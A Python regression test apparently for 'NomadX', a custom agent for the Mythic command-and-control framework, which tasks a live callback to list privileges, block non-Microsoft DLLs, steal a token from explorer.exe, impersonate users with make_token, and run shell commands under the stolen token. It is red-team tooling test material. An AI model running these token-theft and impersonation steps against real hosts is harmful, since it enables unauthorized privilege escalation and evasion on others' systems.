#!/usr/bin/env python3
"""Live Mythic token/privilege regression test for NomadX."""

from __future__ import annotations

import argparse
import json
import pathlib
import sys
import time

_TOOLS = pathlib.Path(__file__).resolve().parent
if str(_TOOLS) not in sys.path:
    sys.path.insert(0, str(_TOOLS))

from mythic_file_test import create_task, gql, task_output, wait_task


def run(url, token, display_id, command, params, verify_tls, log):
    task_id = create_task(url, token, display_id, command, params, verify_tls)
    task = wait_task(url, token, task_id, verify_tls, timeout=60)
    output = task_output(url, token, task_id, verify_tls)
    print(f"[+] {command:14s} task={task_id} status={task['status']} output={len(output)} bytes")
    log.write(f"\n===== {command} =====\n{output}\n")
    return output


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--url", default="https://127.0.0.1:7443/graphql/")
    parser.add_argument("--token-file", default="/tmp/mythic_token")
    parser.add_argument("--callback-display-id", type=int, required=True)
    parser.add_argument("--steal-process", default="explorer.exe")
    parser.add_argument("--make-token-domain", default=".")
    parser.add_argument("--make-token-username", default="")
    parser.add_argument("--make-token-password", default="")
    parser.add_argument("--test-blockdlls", action="store_true")
    parser.add_argument("--exit", action="store_true")
    parser.add_argument("--log", default="/tmp/nomadx_token_test.log")
    parser.add_argument("--verify-tls", action="store_true")
    args = parser.parse_args()

    token = open(args.token_file, encoding="utf-8").read().strip()
    if not token:
        raise SystemExit(f"empty token file: {args.token_file}")

    callback_query = '''
    query($display_id: Int!) {
      callback(where: {display_id: {_eq: $display_id}}) {
        display_id host user payload { payloadtype { name } }
      }
    }
    '''
    rows = gql(args.url, token, callback_query, {"display_id": args.callback_display_id}, args.verify_tls)["data"]["callback"]
    if not rows:
        raise SystemExit(f"callback {args.callback_display_id} not found")
    callback = rows[0]
    if callback["payload"]["payloadtype"]["name"] != "nomadx":
        raise SystemExit("callback is not nomadx")
    print(f"[*] callback {callback['display_id']} host={callback['host']} user={callback['user']}")

    checks = {}
    with open(args.log, "w", encoding="utf-8") as log:
        def call(command, params=None):
            return run(args.url, token, callback["display_id"], command, params or {}, args.verify_tls, log)

        privs = call("getprivs")
        checks["getprivs"] = "Se" in privs and ("[ENABLED]" in privs or "[DISABLED]" in privs)

        listing = call("token_store", {"action": "list", "id": 0})
        checks["token_store list"] = "ID\tUser\tPID" in listing

        if args.test_blockdlls:
            block = call("blockdlls", {"enable": True})
            checks["blockdlls enable"] = "Blocking non-Microsoft DLLs" in block
            # MicrosoftSignedOnly is one-way once enabled; do not require disable.

        ps = call("shell", {"command": f'powershell -NoProfile -Command "(Get-Process {args.steal_process.replace(".exe", "")}).Id"'})
        pid_text = ps.strip().splitlines()[-1].strip() if ps.strip() else ""
        checks["find steal target"] = pid_text.isdigit()
        if pid_text.isdigit():
            steal = call("steal_token", {"pid": int(pid_text)})
            checks["steal_token"] = f"Token stolen from PID {pid_text}" in steal
            listing = call("token_store", {"action": "list", "id": 0})
            checks["token_store captured"] = listing.strip() != ""
            use = call("token_store", {"action": "use", "id": 0})
            checks["token_store use"] = "Using token #0" in use
            shell = call("shell", {"command": "whoami"})
            checks["shell with stolen token"] = "\\" in shell
            rev = call("rev2self")
            checks["rev2self"] = "Reverted to self" in rev
            remove = call("token_store", {"action": "remove", "id": 0})
            checks["token_store remove"] = "Removed token #0" in remove
            empty = call("token_store", {"action": "list", "id": 0})
            checks["token_store empty"] = "(no tokens stored)" in empty
        else:
            checks["steal_token"] = False
            checks["token_store captured"] = False
            checks["token_store use"] = False
            checks["shell with stolen token"] = False
            checks["rev2self"] = False
            checks["token_store remove"] = False
            checks["token_store empty"] = False

        if args.make_token_username and args.make_token_password:
            made = call(
                "make_token",
                {
                    "domain": args.make_token_domain,
                    "username": args.make_token_username,
                    "password": args.make_token_password,
                },
            )
            checks["make_token"] = "Now impersonating" in made
            listing = call("token_store", {"action": "list", "id": 0})
            checks["make_token stored"] = args.make_token_username.lower() in listing.lower()
            rev = call("rev2self")
            checks["make_token rev2self"] = "Reverted to self" in rev
            call("token_store", {"action": "remove", "id": 0})
            call("token_store", {"action": "remove", "id": 1})
        else:
            checks["make_token"] = True
            checks["make_token stored"] = True
            checks["make_token rev2self"] = True

        if args.exit:
            exited = call("exit")
            checks["exit"] = "Agent exiting" in exited

    print("\n[=] token/privilege summary")
    for name, passed in checks.items():
        print(f"    {'PASS' if passed else 'FAIL'}  {name}")
    overall = all(checks.values())
    print(f"[=] {'TOKEN/PRIVILEGE TEST PASSED' if overall else 'TOKEN/PRIVILEGE TEST FAILED'}")
    return 0 if overall else 1


if __name__ == "__main__":
    raise SystemExit(main())
